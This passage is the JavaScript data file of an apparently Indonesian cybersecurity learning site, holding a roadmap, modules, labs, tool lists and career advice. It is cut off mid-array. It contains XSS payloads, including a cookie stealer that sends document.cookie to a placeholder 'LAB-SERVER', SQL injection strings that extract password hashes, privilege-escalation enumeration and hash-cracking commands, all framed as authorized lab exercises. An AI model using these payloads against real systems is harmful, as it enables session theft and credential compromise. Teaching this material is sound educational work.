'use strict';

/* ================================================================
   LOADING SCREEN
================================================================ */
(function initLoader() {
  const loader = document.getElementById('loader-screen');
  const bar = document.getElementById('loader-bar');
  const statusEl = document.getElementById('loader-status-text');
  const logEl = document.getElementById('loader-log');
  if (!loader) return;

  // Boot sequence steps
  const steps = [
    { pct: 10, status: 'LOADING ASSETS', log: '> Mounting filesystem...', cls: 'dim' },
    { pct: 25, status: 'CHECKING MODULES', log: '> Loading security modules... OK', cls: 'ok' },
    { pct: 42, status: 'BUILDING ROADMAP', log: '> Parsing curriculum data... OK', cls: 'ok' },
    { pct: 58, status: 'INITIALIZING LABS', log: '> Lab environment ready... OK', cls: 'ok' },
    { pct: 74, status: 'LOADING QUIZ ENGINE', log: '> Quiz engine initialized... OK', cls: 'ok' },
    { pct: 88, status: 'APPLYING SETTINGS', log: '> Reading localStorage... OK', cls: 'ok' },
    { pct: 100, status: 'SYSTEM ONLINE', log: '> VeloraSec v4.1.0 ready.', cls: 'ok' },
  ];

  let idx = 0;
  const delays = [120, 200, 280, 300, 280, 260, 400]; // ms between each step

  function runStep() {
    if (idx >= steps.length) {
      // All steps done → fade out
      setTimeout(() => {
        loader.classList.add('hide');
        // Remove from DOM after transition ends
        loader.addEventListener('transitionend', () => loader.remove(), { once: true });
      }, 350);
      return;
    }
    const s = steps[idx];
    // Update bar
    bar.style.width = s.pct + '%';
    // Update status
    if (statusEl) statusEl.textContent = s.status;
    // Append log line
    if (logEl) {
      const line = document.createElement('div');
      line.className = 'loader-log-line ' + s.cls;
      line.textContent = s.log;
      logEl.appendChild(line);
      logEl.scrollTop = logEl.scrollHeight;
    }
    idx++;
    setTimeout(runStep, delays[idx - 1] || 250);
  }

  // Small initial pause then start
  setTimeout(runStep, 300);
})();

/* ================================================================
   DATA
================================================================ */

const ROADMAP = [
  {
    level: 1, title: "Fundamental", color: "#22c55e", badge: "Beginner", time: "4-6 weeks", topics: [
      { name: "Computer Basics", desc: "OS concepts, hardware, file systems, processes, memory management." },
      { name: "Networking Basics", desc: "IP addresses, subnets, MAC, packets, routing, switches vs routers." },
      { name: "Linux Basics", desc: "File system hierarchy, permissions, users, processes, package management." },
      { name: "Windows Internals", desc: "Registry, services, processes, Active Directory basics, NTFS permissions." },
      { name: "CLI Usage", desc: "Bash & PowerShell fundamentals, scripting basics, piping, redirection." }
    ]
  },
  {
    level: 2, title: "Networking & Protocols", color: "#00bfff", badge: "Beginner+", time: "6-8 weeks", topics: [
      { name: "TCP/IP Deep Dive", desc: "Three-way handshake, flags, connection states, port numbers." },
      { name: "OSI Model", desc: "All 7 layers with practical attack and defense implications." },
      { name: "DNS", desc: "How DNS works, zone transfers, DNS poisoning, DoH/DoT." },
      { name: "HTTP/HTTPS", desc: "Methods, headers, cookies, sessions, TLS handshake, certificates." },
      { name: "Firewall & VPN", desc: "Stateful inspection, NAT, IPSec, OpenVPN, split tunneling." },
      { name: "Wireshark", desc: "Capture filters, display filters, protocol dissection, IOC hunting." }
    ]
  },
  {
    level: 3, title: "Cybersecurity Core", color: "#8b5cf6", badge: "Intermediate", time: "6-8 weeks", topics: [
      { name: "CIA Triad", desc: "Confidentiality, Integrity, Availability — the foundation of all security." },
      { name: "Threat Modeling", desc: "STRIDE, PASTA, attack trees, threat actor profiling." },
      { name: "Authentication", desc: "MFA, SSO, OAuth2, JWT, Kerberos, LDAP, password policies." },
      { name: "Encryption", desc: "Symmetric/asymmetric, AES, RSA, ECC, PKI, key management." },
      { name: "Hashing", desc: "MD5, SHA family, bcrypt, salting, rainbow tables, collision attacks." },
      { name: "Access Control", desc: "RBAC, ABAC, DAC, MAC, least privilege principle." },
      { name: "Logging & Auditing", desc: "Event logs, syslog, SIEM ingestion, log integrity, retention." }
    ]
  },
  {
    level: 4, title: "Practical Web Security", color: "#f59e0b", badge: "Intermediate", time: "8-10 weeks", topics: [
      { name: "Web Security Fundamentals", desc: "Same-origin policy, CORS, cookies, sessions, CSP headers." },
      { name: "OWASP Top 10", desc: "The definitive list of critical web application security risks." },
      { name: "SQL Injection", desc: "Union-based, blind, error-based, time-based. SQLmap usage." },
      { name: "Cross-Site Scripting (XSS)", desc: "Reflected, stored, DOM-based. CSP bypass techniques." },
      { name: "CSRF", desc: "Attack mechanics, SameSite cookies, token validation bypass." },
      { name: "File Upload Vulnerabilities", desc: "Bypass techniques, webshells, MIME type spoofing." }
    ]
  },
  {
    level: 5, title: "System & Network Attacks", color: "#ef4444", badge: "Advanced", time: "10-12 weeks", topics: [
      { name: "Privilege Escalation", desc: "Linux: SUID, cron, weak perms. Windows: token impersonation, AlwaysInstallElevated." },
      { name: "Reverse Shells", desc: "Netcat, bash, Python, PowerShell payloads. Meterpreter sessions." },
      { name: "Brute Force Attacks", desc: "Hydra, Medusa, Burp Intruder. Rate limiting evasion techniques." },
      { name: "Password Cracking", desc: "Hashcat, John the Ripper, wordlists, rule-based attacks." },
      { name: "Wireless Attacks", desc: "WPA2 handshake capture, evil twin, deauth, PMKID attack." },
      { name: "MITM Attacks", desc: "ARP spoofing, SSL stripping, Bettercap, traffic interception." }
    ]
  },
  {
    level: 6, title: "Defensive Security", color: "#00ffcc", badge: "Intermediate+", time: "8-10 weeks", topics: [
      { name: "SIEM", desc: "Splunk, ELK stack, log aggregation, correlation rules, alerting." },
      { name: "IDS/IPS", desc: "Snort, Suricata, signatures, anomaly detection, tuning." },
      { name: "SOC Workflow", desc: "Alert triage, L1/L2/L3 escalation, ticket management, SLA." },
      { name: "Threat Hunting", desc: "Hypothesis-based hunting, MITRE ATT&CK mapping, IOC pivot." },
      { name: "Incident Response", desc: "PICERL framework, containment, eradication, recovery, lessons learned." }
    ]
  },
  {
    level: 7, title: "Advanced Specializations", color: "#ec4899", badge: "Expert", time: "12+ weeks", topics: [
      { name: "Malware Analysis", desc: "Static (strings, PE headers), dynamic (sandbox), YARA rules." },
      { name: "Reverse Engineering", desc: "x86/x64 assembly, Ghidra, IDA Free, disassembly vs decompilation." },
      { name: "Digital Forensics", desc: "Disk imaging, memory forensics, file carving, chain of custody." },
      { name: "Memory Analysis", desc: "Volatility3, process injection detection, rootkit artifacts." },
      { name: "Active Directory", desc: "Kerberoasting, AS-REP roasting, BloodHound, Pass-the-Hash." },
      { name: "Cloud Security", desc: "AWS/Azure/GCP, IAM misconfigs, S3 bucket exposure, CSPM tools." }
    ]
  }
];

const MODULES = [
  {
    id: "tcp-ip", title: "TCP/IP Protocol Suite", level: "beginner", icon: "fas fa-network-wired", color: "var(--secondary)",
    summary: "Backbone of all network communication — essential untuk semua jalur karier.",
    sections: [
      { title: "What is TCP/IP?", body: "TCP/IP adalah suite protokol untuk menghubungkan perangkat jaringan. TCP mengelola pengiriman data yang andal dan terurut. IP mengelola pengalamatan dan routing paket." },
      { title: "Three-Way Handshake", body: "Membentuk koneksi TCP:\n1. Client → SYN\n2. Server → SYN-ACK\n3. Client → ACK\nKoneksi full-duplex siap sebelum transfer data.", code: "# Capture handshake dengan tcpdump\ntcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'\n\n# Wireshark display filter\ntcp.flags.syn==1 || tcp.flags.ack==1\n\n# Lihat connection state\nss -tnp" },
      { title: "Common Mistakes", body: "❌ Bingung antara TCP (reliable) dan UDP (fast, unreliable)\n❌ Mengira paket selalu melewati jalur yang sama\n❌ Mengabaikan TCP flags saat analisis paket\n❌ Tidak memahami sequence & acknowledgment numbers" },
      { title: "Attack Scenarios", body: "• SYN Flood: Ribuan SYN tanpa menyelesaikan handshake → exhaustion server\n• TCP Hijacking: Prediksi sequence number → inject paket ke koneksi aktif\n• TCP RST Attack: Kirim RST palsu → putuskan koneksi legitim" },
      { title: "Defense Mindset", body: "✅ SYN cookies untuk mencegah SYN flood\n✅ Monitor kombinasi flag abnormal di firewall log\n✅ Stateful firewall yang melacak connection state\n✅ Rate limiting koneksi baru per IP" }
    ]
  },
  {
    id: "sql-injection", title: "SQL Injection", level: "intermediate", icon: "fas fa-database", color: "var(--warn)",
    summary: "Kerentanan web paling kritis. OWASP Top 10 #3 — wajib dikuasai setiap security professional.",
    sections: [
      { title: "Apa itu SQL Injection?", body: "Terjadi ketika input pengguna digabungkan ke query SQL tanpa sanitasi. Penyerang bisa manipulasi query, bypass auth, ekstrak data, bahkan execute OS commands." },
      { title: "Jenis-jenis SQLi", body: "1. UNION-based: Tambahkan SELECT statement\n2. Boolean-based Blind: Pertanyaan true/false\n3. Time-based Blind: Gunakan SLEEP() untuk inferensi\n4. Error-based: Ekstrak data via error message\n5. Out-of-band: Exfiltrate via DNS/HTTP" },
      { title: "Contoh Kode", body: "Perbandingan kode rentan vs aman:", code: "// ❌ VULNERABLE\n$q = \"SELECT * FROM users WHERE user='\" . $_GET['u'] . \"'\";\n// Input: ' OR '1'='1  →  Bypass auth!\n\n// ✅ SECURE — Prepared Statements\n$stmt = $pdo->prepare('SELECT * FROM users WHERE user = ?');\n$stmt->execute([$_GET['u']]);" },
      { title: "Teknik Deteksi (Lab Only)", body: "• Tambahkan tanda kutip tunggal ' → lihat error\n• AND 1=1 vs AND 1=2 → boolean test\n• '; WAITFOR DELAY '0:0:5'-- → time-based (MSSQL)\n• SQLmap untuk automated testing di lab" },
      { title: "Defense Mindset", body: "✅ SELALU gunakan parameterized queries\n✅ Input validation & whitelisting\n✅ Least privilege untuk akun database\n✅ WAF sebagai defense-in-depth\n✅ Jangan expose error database ke user" }
    ]
  },
  {
    id: "xss", title: "Cross-Site Scripting (XSS)", level: "intermediate", icon: "fas fa-code", color: "var(--danger)",
    summary: "Injeksi skrip berbahaya yang dieksekusi di browser korban. OWASP Top 10 #3.",
    sections: [
      { title: "XSS Dijelaskan", body: "XSS menyuntikkan skrip berbahaya ke halaman web yang dilihat pengguna lain. Berbeda dengan SQLi (menyerang server), XSS menyerang end user melalui website yang dikompromikan." },
      { title: "Tiga Jenis XSS", body: "1. Reflected: Payload dalam URL, dieksekusi langsung\n2. Stored: Tersimpan di DB, dieksekusi setiap halaman dimuat — paling berbahaya\n3. DOM-based: Manipulasi DOM client-side tanpa melibatkan server" },
      { title: "Payload Contoh (Lab Only)", body: "Gunakan HANYA di lingkungan lab yang kamu kontrol:", code: "<!-- Basic test -->\n<script>alert(document.domain)</script>\n\n<!-- Event handler bypass -->\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n<!-- Cookie stealer (lab demo only) -->\n<script>new Image().src='http://LAB-SERVER/?c='+document.cookie</script>" },
      { title: "Defense Mindset", body: "✅ Output encoding (HTML entities) untuk semua user data\n✅ Content Security Policy (CSP) headers yang ketat\n✅ HttpOnly + Secure flags pada cookies\n✅ Library DOMPurify untuk konten dinamis\n✅ Framework modern yang auto-escape (React, Vue, Angular)" }
    ]
  },
  {
    id: "privesc", title: "Privilege Escalation", level: "advanced", icon: "fas fa-arrow-up-right-dots", color: "var(--danger)",
    summary: "Teknik eskalasi dari akses terbatas ke root/SYSTEM — inti dari post-exploitation.",
    sections: [
      { title: "Apa itu PrivEsc?", body: "Setelah initial access, penyerang biasanya memiliki privilege terbatas. PrivEsc adalah proses mengeksploitasi miskonfigurasi atau kerentanan untuk mendapatkan akses lebih tinggi." },
      { title: "Vektor Linux", body: "• SUID/SGID binaries dengan shell escape\n• Cron jobs yang bisa ditulis, berjalan sebagai root\n• Miskonfigurasi sudo (sudo -l)\n• Weak file permissions\n• PATH hijacking\n• Kernel exploits", code: "# Enumerasi (hanya di sistem yang kamu izinkan)\nfind / -perm -u=s -type f 2>/dev/null   # SUID bins\nsudo -l                                   # Sudo privs\ncat /etc/crontab && ls /etc/cron.*        # Cron jobs\nenv; echo $PATH                           # Environment\nls -la /home/*                            # Home dirs" },
      { title: "Vektor Windows", body: "• Token impersonation (SeImpersonatePrivilege)\n• AlwaysInstallElevated registry key\n• Unquoted service paths\n• Weak service permissions\n• DLL hijacking\n• Pass-the-Hash / Pass-the-Ticket" },
      { title: "Tools Enumerasi", body: "• LinPEAS / WinPEAS: Otomasi enumerasi lengkap\n• LinEnum: Pengecekan privesc Linux\n• PowerUp: Berbasis PowerShell untuk Windows\n• BloodHound: Visualisasi attack path di Active Directory" }
    ]
  },
  {
    id: "cia", title: "CIA Triad", level: "beginner", icon: "fas fa-shield-halved", color: "var(--primary)",
    summary: "Model fondasi keamanan informasi — setiap keputusan security berakar dari CIA Triad.",
    sections: [
      { title: "Confidentiality", body: "Data hanya dapat diakses oleh pihak yang berwenang.\nMekanisme: enkripsi, access control, autentikasi, klasifikasi data, DLP (Data Loss Prevention)." },
      { title: "Integrity", body: "Data akurat dan tidak dimodifikasi tanpa otorisasi.\nMekanisme: hashing, digital signatures, version control, checksums, audit trails." },
      { title: "Availability", body: "Sistem dan data tersedia saat dibutuhkan.\nMekanisme: redundansi, backup, DDoS protection, disaster recovery, uptime monitoring." },
      { title: "Contoh Dunia Nyata", body: "Rekam medis rumah sakit:\n• Confidential: Hanya dokter/perawat berwenang yang bisa mengakses\n• Integral: Dosis obat tidak boleh dimodifikasi tanpa otorisasi\n• Available: Akses darurat harus selalu berfungsi 24/7\n\nJika salah satu dilanggar, bisa berakibat fatal." }
    ]
  },
  {
    id: "hashing", title: "Cryptographic Hashing", level: "beginner", icon: "fas fa-hashtag", color: "var(--accent)",
    summary: "Fungsi satu arah menghasilkan fingerprint berukuran tetap — fundamental kriptografi.",
    sections: [
      { title: "Apa itu Hashing?", body: "Hash function: input ukuran apapun → output ukuran tetap (digest).\nSifat: deterministic, one-way (tidak bisa dibalik), collision-resistant." },
      { title: "Algoritma & Status", body: "• MD5: 128-bit — RUSAK, jangan gunakan untuk keamanan\n• SHA-1: 160-bit — DEPRECATED, collision attacks terbukti\n• SHA-256: 256-bit — KUAT, standar saat ini\n• SHA-3: 256/512-bit — TERKUAT, standar NIST terbaru\n• bcrypt: Adaptive — TERBAIK untuk password, ada salt + cost factor" },
      { title: "Password Cracking Demo", body: "Mengapa password lemah berbahaya:", code: "# Generate hash MD5\necho -n 'password123' | md5sum\n# → 482c811da5d5b4bc6d497ffa98491e38\n\n# Dictionary attack (hashcat)\nhashcat -m 0 -a 0 hash.txt rockyou.txt\n\n# Rule-based attack\nhashcat -m 0 hash.txt rockyou.txt -r best64.rule\n\n# Generate bcrypt yang benar (Python)\nimport bcrypt\nhash = bcrypt.hashpw(b'password', bcrypt.gensalt(rounds=12))" }
    ]
  }
];

const LABS = [
  {
    id: "port-scan", title: "Port Scanning dengan Nmap", level: "basic", icon: "fa-solid fa-magnifying-glass", color: "var(--success)",
    objective: "Memahami cara kerja port scanner dan mengidentifikasi layanan terbuka di target.",
    tools: ["Nmap", "Linux terminal", "Virtual lab environment"],
    warning: "HANYA jalankan terhadap sistem milikmu atau yang ada izin tertulis eksplisit.",
    steps: [
      { n: 1, cmd: "nmap -sn 192.168.1.0/24", desc: "Host discovery — temukan host aktif di jaringan" },
      { n: 2, cmd: "nmap -sV -sC 192.168.1.10", desc: "Deteksi versi service + default NSE scripts" },
      { n: 3, cmd: "nmap -p- --min-rate 5000 192.168.1.10", desc: "Full port scan (semua 65535 port)" },
      { n: 4, cmd: "nmap -sU -p 53,161,123 192.168.1.10", desc: "UDP scan pada port UDP umum" },
      { n: 5, cmd: "nmap -O 192.168.1.10", desc: "OS fingerprinting (memerlukan root/admin)" }
    ],
    expected: "Daftar port terbuka, service yang berjalan, dan versinya. Gunakan untuk mengidentifikasi attack surface potensial."
  },
  {
    id: "sqli-lab", title: "SQL Injection di DVWA", level: "intermediate", icon: "fas fa-database", color: "var(--warn)",
    objective: "Praktikkan teknik SQL injection pada aplikasi DVWA yang sengaja dibuat rentan.",
    tools: ["DVWA (Damn Vulnerable Web Application)", "Browser", "Burp Suite Community (optional)"],
    warning: "Hanya gunakan DVWA secara lokal di VM. Jangan pernah uji SQLi pada website nyata.",
    steps: [
      { n: 1, cmd: "' OR '1'='1", desc: "Uji bypass autentikasi dasar di field username" },
      { n: 2, cmd: "1 UNION SELECT 1,user()-- -", desc: "UNION injection — dapatkan current DB user" },
      { n: 3, cmd: "1 UNION SELECT 1,database()-- -", desc: "Ambil nama database yang sedang digunakan" },
      { n: 4, cmd: "1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -", desc: "Daftar semua tabel" },
      { n: 5, cmd: "1 UNION SELECT user,password FROM users-- -", desc: "Ekstrak username dan password hash" }
    ],
    expected: "Bisa mengekstrak nama database, tabel, dan credential pengguna dari database DVWA."
  },
  {
    id: "wireshark", title: "Wireshark Traffic Analysis", level: "basic", icon: "fas fa-wave-square", color: "var(--secondary)",
    objective: "Capture dan analisis traffic jaringan untuk mengidentifikasi protokol dan ancaman potensial.",
    tools: ["Wireshark", "Linux atau Windows", "Akses network interface"],
    warning: "Hanya capture traffic di jaringan yang kamu miliki atau punya izin untuk monitor.",
    steps: [
      { n: 1, cmd: "tcp.port == 80 or tcp.port == 443", desc: "Filter hanya traffic HTTP/HTTPS" },
      { n: 2, cmd: "http.request.method == 'POST'", desc: "Temukan POST request (mungkin berisi credential)" },
      { n: 3, cmd: "dns", desc: "Tampilkan semua query dan respons DNS" },
      { n: 4, cmd: "icmp", desc: "Tampilkan semua traffic ICMP (ping)" },
      { n: 5, cmd: "tcp.flags.syn==1 && tcp.flags.ack==0", desc: "Temukan paket SYN — awal koneksi baru" }
    ],
    expected: "Identifikasi host yang berkomunikasi, protokol yang digunakan, dan credential yang tidak terenkripsi."
  },
  {
    id: "hash-crack", title: "Hash Cracking Demo", level: "intermediate", icon: "fas fa-hashtag", color: "var(--accent)",
    objective: "Memahami bagaimana password lemah di-crack dari database hash yang dicuri.",
    tools: ["Hashcat", "John the Ripper", "rockyou.txt wordlist", "Linux (Kali/Parrot)"],
    warning: "Hanya crack hash yang kamu buat sendiri atau punya izin untuk dianalisis.",
    steps: [
      { n: 1, cmd: "echo -n 'password123' | md5sum", desc: "Generate hash MD5 untuk di-crack" },
      { n: 2, cmd: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", desc: "Dictionary attack dengan Hashcat" },
      { n: 3, cmd: "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a", desc: "Brute force 6 karakter alphanumeric" },
      { n: 4, cmd: "john --format=md5 --wordlist=rockyou.txt hash.txt", desc: "Attack menggunakan John the Ripper" },
      { n: 5, cmd: "hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule", desc: "Rule-based attack untuk variasi password" }
    ],
    expected: "Password sederhana crack dalam detik. Perhatikan bagaimana kompleksitas meningkatkan waktu cracking secara eksponensial."
  },
  {
    id: "incident", title: "Incident Response Simulation", level: "advanced", icon: "fa-solid fa-user-shield", color: "var(--danger)",
    objective: "Walkthrough alur kerja incident response menggunakan framework PICERL.",
    tools: ["Splunk Free Trial", "Volatility3", "FTK Imager", "Timeline Explorer"],
    warning: "Simulasi menggunakan artifact yang sudah dikumpulkan. Jangan pernah collect evidence dari sistem produksi tanpa otorisasi.",
    steps: [
      { n: 1, cmd: "PREPARATION", desc: "Review IR playbook. Verifikasi tools siap. Identifikasi stakeholder dan jalur komunikasi." },
      { n: 2, cmd: "IDENTIFICATION", desc: "Analisis SIEM alert. Korelasi log berbagai sumber. Tentukan scope dan initial IOC." },
      { n: 3, cmd: "CONTAINMENT", desc: "Isolasi sistem dari jaringan. Preserve volatile memory. Notifikasi manajemen." },
      { n: 4, cmd: "ERADICATION", desc: "Hapus malware artifacts. Patch kerentanan. Reset compromised credentials." },
      { n: 5, cmd: "RECOVERY", desc: "Restore dari backup bersih. Monitor re-infeksi. Return ke produksi secara bertahap." }
    ],
    expected: "Memahami framework PICERL dan mampu menulis laporan incident response dasar yang profesional."
  }
];

const TOOLS = {
  "Networking": [
    { name: "Wireshark", func: "Network packet capture & analysis", diff: 2, use: "Analisis traffic, debugging protokol, deteksi intrusi", pros: "GUI-based, filter canggih, dissector protokol lengkap", cons: "Bisa overwhelming karena volume data", url: "https://wireshark.org", url1: "guides/Wireshark/wireshark-guide.html" },
    { name: "Nmap", func: "Network discovery & security auditing", diff: 2, use: "Port scanning, OS detection, enumerasi service", pros: "Standar industri, NSE scripts, sangat versatile", cons: "Bisa trigger IDS alert jika tidak hati-hati", url: "https://nmap.org", url1: "guides/Nmap/nmap-ethical-guide.html" },
    { name: "tcpdump", func: "Command-line packet capture", diff: 3, use: "Headless server, scripting, quick capture", pros: "Ringan, scriptable, tersedia hampir di semua sistem", cons: "Tidak ada GUI, learning curve cukup tinggi", url: "https://tcpdump.org", url1: "guides/Tcpdump/tcpdump-guide.html" }
  ],
  "Web Security": [
    { name: "Burp Suite", func: "Web application security testing proxy", diff: 3, use: "Intercept HTTP, fuzzing, testing SQLi/XSS", pros: "Standar industri untuk web pentest, scanner canggih", cons: "Versi Pro mahal ($449/yr), UI kompleks untuk pemula", url: "https://portswigger.net/burp", url1: "pages/coming-soon.html" },
    { name: "OWASP ZAP", func: "Open-source web application scanner", diff: 2, use: "Automated scanning, spidering, analisis pasif", pros: "Gratis, dikembangkan aktif, bagus untuk pemula", cons: "Lebih banyak false positives vs Burp Pro", url: "https://zaproxy.org", url1: "guides/OwaspZap/owasp-zap-guide.html" }
  ],
  "Forensics": [
    { name: "Autopsy", func: "Digital forensics investigation platform", diff: 3, use: "Analisis disk, recovery file, pembuatan timeline", pros: "Gratis, GUI-based, extensible via plugin", cons: "Bisa lambat di image disk yang besar", url: "https://sleuthkit.org/autopsy", url1: "misc/coming-soon.html" },
    { name: "Volatility3", func: "Memory forensics framework", diff: 4, use: "Analisis dump RAM untuk malware dan artifact", pros: "Gold standard memory forensics, aktif dikembangkan", cons: "CLI-only, memerlukan pengetahuan Python", url: "https://volatilityfoundation.org", url1: "misc/coming-soon.html" }
  ],
  "Reverse Engineering": [
    { name: "Ghidra", func: "Software reverse engineering framework (NSA)", diff: 4, use: "Disassembly, decompilation, analisis malware", pros: "Gratis, powerful, fitur kolaborasi tim", cons: "Berbasis Java (agak lambat), learning curve tinggi", url: "https://ghidra-sre.org", url1: "guides/Ghidra/ghidra-reference-guide.html" },
    { name: "x64dbg", func: "Open-source Windows debugger", diff: 4, use: "Dynamic analysis, debugging malware, unpacking", pros: "Gratis, ekosistem plugin luas, aktif dikembangkan", cons: "Windows-only, kompleks untuk pemula", url: "https://x64dbg.com", url1: "misc/coming-soon.html" }
  ],
  "Lab Environments": [
    { name: "Kali Linux", func: "Penetration testing distribution", diff: 2, use: "600+ pre-installed security tools", pros: "Standar industri, komunitas besar, tool selalu update", cons: "Disalahgunakan script kiddies tanpa pemahaman dasar", url: "https://kali.org", url1: "misc/coming-soon.html" },
    { name: "VirtualBox", func: "Free virtualization platform", diff: 1, use: "Menjalankan lab environment yang terisolasi", pros: "Gratis, cross-platform, fitur snapshot berguna", cons: "Overhead performa, fitur lebih sedikit dari VMware Pro", url: "https://virtualbox.org", url1: "misc/coming-soon.html" }
  ]
};

const CAREERS = [
  {
    title: "SOC Analyst", level: "Entry-Mid", color: "var(--success)", icon: "fas fa-eye",
    skills: ["SIEM (Splunk/ELK)", "Analisis log", "Triage insiden", "Networking dasar", "Threat intelligence"],
    duration: "6-18 bulan untuk level entry",
    certs: ["Security+", "Google Cybersecurity", "CySA+"],
    daily: "Monitor security alerts, triage insiden, eskalasi temuan, tulis laporan insiden, tune detection rules."
  },
  {
    title: "Penetration Tester", level: "Mid-Senior", color: "var(--danger)", icon: "fas fa-bug",
    skills: ["Web app testing", "Network pentesting", "Report writing", "Python/Bash scripting", "Active Directory"],
    duration: "2-4 tahun untuk level profesional",
    certs: ["eJPT", "PNPT", "OSCP", "CEH"],
    daily: "Jalankan simulasi serangan terautorisasi, dokumentasi kerentanan, tulis laporan pentesting detail."
  },
  {
    title: "Malware Analyst", level: "Mid-Senior", color: "var(--warn)", icon: "fas fa-virus",
    skills: ["Assembly language", "Reverse engineering", "Static/dynamic analysis", "Python scripting", "YARA rules"],
    duration: "3-5 tahun studi khusus",
    certs: ["GREM", "CRTO", "eCMAP"],
    daily: "Analisis sampel malware, reverse engineer binary, tulis detection signatures, threat hunting."
  },
  {
    title: "DFIR Specialist", level: "Mid-Senior", color: "var(--secondary)", icon: "fas fa-magnifying-glass",
    skills: ["Digital forensics", "Memory analysis", "Evidence handling", "Pengetahuan hukum", "Incident response"],
    duration: "2-4 tahun untuk spesialisasi",
    certs: ["GCFE", "GCFA", "GNFA"],
    daily: "Investigasi insiden keamanan, preserve digital evidence, tulis laporan forensik."
  },
  {
    title: "Security Engineer", level: "Mid-Senior", color: "var(--accent)", icon: "fas fa-gears",
    skills: ["Cloud platforms", "DevSecOps", "Scripting & otomasi", "Arsitektur keamanan", "Compliance"],
    duration: "3-5 tahun dengan background SWE",
    certs: ["AWS Security Specialty", "CISSP", "CKS"],
    daily: "Rancang arsitektur keamanan, implementasi controls, code review, otomasi keamanan."
  },
  {
    title: "Threat Hunter", level: "Senior", color: "#ec4899", icon: "fas fa-crosshairs",
    skills: ["Analisis berbasis hipotesis", "MITRE ATT&CK", "KQL/SPL queries", "Threat intelligence", "Data analysis"],
    duration: "4-6 tahun di security operations",
    certs: ["GCIH", "GCTI", "TH Practitioner"],
    daily: "Proaktif mencari ancaman yang lolos deteksi otomatis. Buat hunting playbooks."
  }
];

const CERTS = {
  "Beginner": [
    { name: "Google Cybersecurity Certificate", org: "Google/Coursera", diff: 1, time: "3-6 bulan", cost: "~$200", desc: "Titik mulai yang sempurna. Fundamental dengan labs praktis. Diakui secara luas." },
    { name: "ISC2 CC (Certified in Cybersecurity)", org: "ISC2", diff: 1, time: "2-4 bulan", cost: "Ujian GRATIS", desc: "Sertifikasi entry-level gratis dari ISC2. Fondasi solid, diakui global." }
  ],
  "Intermediate": [
    { name: "CompTIA Security+", org: "CompTIA", diff: 2, time: "3-6 bulan", cost: "~$400", desc: "Persyaratan baseline DoD AS. Standar industri untuk role SOC dan IT Security." },
    { name: "eLearnSecurity eJPT", org: "INE", diff: 2, time: "2-3 bulan", cost: "~$200", desc: "Ujian pentesting hands-on. Sangat praktis, perfect untuk pemula yang ingin mencoba." },
    { name: "TCM PNPT", org: "TCM Security", diff: 3, time: "4-6 bulan", cost: "~$400", desc: "Real-world pentesting exam termasuk penulisan laporan. Sangat direkomendasikan." }
  ],
  "Advanced": [
    { name: "OSCP", org: "Offensive Security", diff: 5, time: "6-12 bulan prep", cost: "~$1,500", desc: "Gold standard pentesting. Ujian hands-on 24 jam. Sangat menantang namun sangat dihargai." },
    { name: "CRTO", org: "Zero-Point Security", diff: 4, time: "3-6 bulan", cost: "~$500", desc: "Red team, Cobalt Strike, Active Directory. Kualitas konten excellent, sangat praktis." },
    { name: "CISSP", org: "ISC2", diff: 4, time: "8-12 bulan", cost: "~$700", desc: "Management-level cert. Butuh 5 tahun pengalaman. Sangat dihormati untuk senior roles." }
  ]
};

const MINDSET = [
  {
    type: "warn", icon: "fa-triangle-exclamation", title: "Cybersecurity BUKAN jalan cepat kaya",
    body: "Banyak pemula berharap mendapat gaji besar dalam 6 bulan. Realita: sebagian besar profesional butuh 2–4 tahun studi konsisten. Tidak ada jalan pintas menuju kompetensi nyata."
  },
  {
    type: "info", icon: "fa-lightbulb", title: "Skills > Tools",
    body: "Kali Linux tidak menjadikanmu hacker, sama seperti memiliki gitar tidak menjadikanmu musisi. Memahami MENGAPA sesuatu bekerja jauh lebih berharga daripada menghafal perintah. Tools berubah — pemahaman tidak."
  },
  {
    type: "success", icon: "fa-calendar-check", title: "Konsistensi mengalahkan binge learning",
    body: "1 jam setiap hari selama 6 bulan lebih efektif daripada maraton 12 jam di akhir pekan. Otak mengkonsolidasikan knowledge saat istirahat dan tidur. Bangun kebiasaan harian yang sustainable."
  },
  {
    type: "warn", icon: "fa-network-wired", title: "Jangan skip networking fundamentals",
    body: "Kesalahan #1 pemula: langsung ke 'hacking tools' tanpa memahami TCP/IP, DNS, dan HTTP. Kamu tidak bisa hack apa yang tidak kamu pahami. Networking adalah fondasi yang tidak bisa dilewati."
  },
  {
    type: "info", icon: "fa-terminal", title: "Linux bukan opsional",
    body: "95% security tools berjalan di Linux. Sebagian besar server berjalan Linux. Jika serius dengan cybersecurity, command line Linux WAJIB dikuasai. Ini bukan nice-to-have — ini prerequisite."
  },
  {
    type: "danger", icon: "fa-scale-balanced", title: "Ethics bukan sekadar kepatuhan hukum",
    body: "Hacking tanpa izin adalah tindakan ilegal di hampir setiap negara. Komunitas keamanan bergantung pada kepercayaan. Pengujian tanpa izin, bahkan 'hanya untuk belajar,' bisa menghancurkan kariermu sebelum dimulai."
  },
  {
    type: "success", icon: "fa-file-pen", title: "Dokumentasi adalah superpower",
    body: "Profesional menulis. Mereka dokumentasikan metodologi, temuan, dan prosedur. Kemampuan menulis laporan keamanan yang jelas seringkali menjadi pembeda utama dalam proses hiring. Mulai jurnal belajar dari hari pertama."
  },
  {
    type: "info", icon: "fa-infinity", title: "Cybersecurity adalah pembelajaran seumur hidup",
    body: "CVE baru muncul setiap hari. Teknik serangan berkembang. Saat berhenti belajar, kamu mulai tertinggal. Embrace ketidaknyamanan tidak tahu segalanya — itu tanda kamu sedang berkembang."
  }
];

const PLANNER = [
  {
    week: 1, theme: "Computer & Networking Basics", days: [
      "Tonton: OSI Model explained (NetworkChuck YouTube)",
      "Lab: Setup VirtualBox + install Kali Linux VM",
      "Pelajari: Pengalamatan IPv4 dan subnetting dasar",
      "Latihan: 20 soal subnetting di subnet.ninja",
      "Pelajari: TCP/IP three-way handshake secara detail",
      "Lab: Capture paket dengan Wireshark selama 30 menit",
      "Review + Catat: Dokumentasikan semua yang dipelajari minggu ini"
    ]
  },
  {
    week: 2, theme: "Linux Command Line Mastery", days: [
